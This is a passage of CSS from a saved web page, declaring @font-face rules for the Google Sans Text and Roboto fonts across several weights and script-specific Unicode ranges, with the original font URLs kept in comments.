                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* tamil */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnn5jtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0B82-0BFA, U+200C-200D, U+20B9, U+25CC;
            }
            /* telugu */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnRjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C00-0C7F, U+1CDA, U+1CF2, U+200C-200D, U+25CC;
            }
            /* thai */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnnxjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+02D7, U+0303, U+0331, U+0E01-0E5B, U+200C-200D, U+25CC;
            }
            /* vietnamese */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmdjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmZjtiu7.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUp9-KzpRiLCAt4Unrc-xIKmCU5oPFTnmhjtg.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* math */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C,
                    U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9,
                    U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043,
                    U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1,
                    U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE,
                    U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319,
                    U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF,
                    U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF,
                    U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
            }
            /* symbols */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMaxKUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* vietnamese */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3OUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3KUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 300;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* math */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C,
                    U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9,
                    U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043,
                    U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1,
                    U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE,
                    U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319,
                    U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF,
                    U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF,
                    U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
            }
            /* symbols */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMaxKUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* vietnamese */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3OUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3KUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 400;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* math */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C,
                    U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9,
                    U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043,
                    U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1,
                    U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE,
                    U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319,
                    U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF,
                    U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF,
                    U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
            }
            /* symbols */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMaxKUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* vietnamese */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3OUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3KUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 500;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* math */
            @font-face {
                font-family: "Roboto";
                font-style: normal;
                font-weight: 700;
                font-stretch: 100%;
                src: /*savepage-url=https://fonts.gstatic.com/s/roboto/v49/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBGEe.woff2*/
                    url() format("woff2");
                unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C,
                    U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9,
                    U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043,
                    U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1,
                    U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE,
                    U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319,
